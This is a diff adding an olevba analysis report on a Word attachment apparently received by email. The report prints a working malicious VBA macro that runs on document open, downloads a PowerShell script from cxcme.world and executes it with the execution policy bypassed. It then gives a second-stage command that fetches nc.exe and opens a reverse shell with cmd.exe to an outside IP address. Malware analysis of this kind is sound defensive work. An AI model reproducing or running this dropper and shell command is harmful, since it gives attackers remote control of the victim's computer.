@@ -1,0 +1,83 @@
+olevba 0.60.2 on Python 3.13.2 - http://decalage.info/python/oletools
+===============================================================================
+FILE: extract-1736327622.698102-SMTP-FjxTZg4fFkVenDEBo6
+Type: OpenXML
+WARNING  For now, VBA stomping cannot be detected for files in memory
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+(empty macro)
+-------------------------------------------------------------------------------
+VBA MACRO Module1.bas 
+in file: word/vbaProject.bin - OLE stream: 'VBA/Module1'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Sub AutoOpen()
+    SpJniaHv
+End Sub
+
+Sub SpJniaHv()
+    On Error Resume Next
+    Dim dhP39Q4n As String
+    Dim BuPeTRar As String
+    Dim K5BAmBU5 As String
+
+    dhP39Q4n = "http://cxcme.world/download.ps1"
+
+    BuPeTRar = Environ("TEMP") & "\download.ps1"
+
+    Dim Z8F1RRYd As Object
+    Set Z8F1RRYd = CreateObject("MSXML2.XMLHTTP")
+
+    Z8F1RRYd.Open "GET", dhP39Q4n, False
+    Z8F1RRYd.Send
+
+    If Z8F1RRYd.Status = 200 Then
+        Dim Gz8pyPpq As Object
+        Set Gz8pyPpq = CreateObject("Scripting.FileSystemObject")
+        
+        Dim MFwrZu1p As Object
+        Set MFwrZu1p = Gz8pyPpq.CreateTextFile(BuPeTRar, True)
+        MFwrZu1p.Write Z8F1RRYd.responseText
+        MFwrZu1p.Close
+
+        K5BAmBU5 = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File """ & BuPeTRar & """"
+
+        Shell K5BAmBU5, vbNormalFocus
+    Else
+        MsgBox "asdadadasd", vbCritical
+    End If
+
+    On Error Resume Next
+    Set Z8F1RRYd = Nothing
+    Set Gz8pyPpq = Nothing
+End Sub
+
+
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
+|Suspicious|Environ             |May read system environment variables        |
+|Suspicious|Open                |May open a file                              |
+|Suspicious|Write               |May write to a file (if combined with Open)  |
+|Suspicious|CreateTextFile      |May create a text file                       |
+|Suspicious|Shell               |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|vbNormalFocus       |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|powershell          |May run PowerShell commands                  |
+|Suspicious|ExecutionPolicy     |May run PowerShell commands                  |
+|Suspicious|NoProfile           |May run PowerShell commands                  |
+|Suspicious|CreateObject        |May create an OLE object                     |
+|Suspicious|MSXML2.XMLHTTP      |May download files from the Internet         |
+|IOC       |http://cxcme.world/d|URL                                          |
+|          |ownload.ps1         |                                             |
+|IOC       |download.ps1        |Executable file name                         |
+|IOC       |powershell.exe      |Executable file name                         |
++----------+--------------------+---------------------------------------------+
+
+
+Invoke-WebRequest -Uri "http://cxcme.world/nc.exe" -OutFile "$env:TEMP\Imports.exe" -UseBasicParsing^MStart-Process "$env:TEMP\\Imports.exe" -ArgumentList "4.100.68.156 999 -e cmd.exe"^M                                                                                                                                                                                                                                           
+
+                 
